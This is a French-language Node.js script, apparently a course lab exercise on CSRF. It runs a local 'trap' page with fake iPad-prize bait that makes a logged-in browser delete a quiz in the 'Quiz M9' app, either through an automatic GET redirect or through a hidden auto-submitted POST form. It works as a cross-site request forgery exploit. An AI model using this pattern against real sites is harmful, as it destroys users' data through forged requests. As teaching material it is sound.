/**
 * Un site piégé, pour l'exercice 13 (CSRF). Il n'a rien à voir avec Quiz M9 :
 * c'est une page d'un AUTRE site, qu'une victime connectée à Quiz M9 visite.
 *
 *   node attacks/csrf-trap.js 7        (7 : l'id du questionnaire visé)
 *
 * puis ouvrir, dans le navigateur connecté à Quiz M9 :
 *
 *   http://127.0.0.1:8080/             un lien suivi tout seul (GET)
 *   http://127.0.0.1:8080/formulaire   un formulaire envoyé tout seul (POST)
 *
 * 127.0.0.1 et localhost sont deux SITES différents pour le navigateur.
 * Essayez aussi http://localhost:8080/ : même site que localhost:5173, le
 * port ne compte pas.
 */
import { createServer } from 'node:http';

const quizId = Number(process.argv[2]);
if (!Number.isInteger(quizId)) {
  console.error('Usage : node attacks/csrf-trap.js <id du questionnaire>');
  process.exit(1);
}
const QUIZ_M9 = process.env.QUIZ_M9 ?? 'http://localhost:5173';

const pages = {
  '/': `
    <h1>Vous avez gagné un iPad !</h1>
    <p>Redirection vers votre prix…</p>
    <script>
      setTimeout(() => { location.href = '${QUIZ_M9}/api/quizzes/${quizId}/delete'; }, 1500);
    </script>`,
  '/formulaire': `
    <h1>Vous avez gagné un iPad !</h1>
    <form id="piege" method="post" action="${QUIZ_M9}/quizzes">
      <input type="hidden" name="intent" value="delete" />
      <input type="hidden" name="quizId" value="${quizId}" />
    </form>
    <script>
      setTimeout(() => document.getElementById('piege').submit(), 1500);
    </script>`,
};

function handler(req, res) {
  const page = pages[new URL(req.url, 'http://x').pathname];
  if (!page) {
    res.writeHead(404).end();
    return;
  }
  res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
  res.end(`<!doctype html><meta charset="utf-8"><title>Concours</title>${page}`);
}

// Seulement sur ce poste : 127.0.0.1 (IPv4) et ::1 (IPv6, où localhost mène souvent).
createServer(handler).listen(8080, '127.0.0.1');
createServer(handler).listen(8080, '::1');
console.log(`Site piégé : http://127.0.0.1:8080/ et /formulaire (questionnaire ${quizId})`);
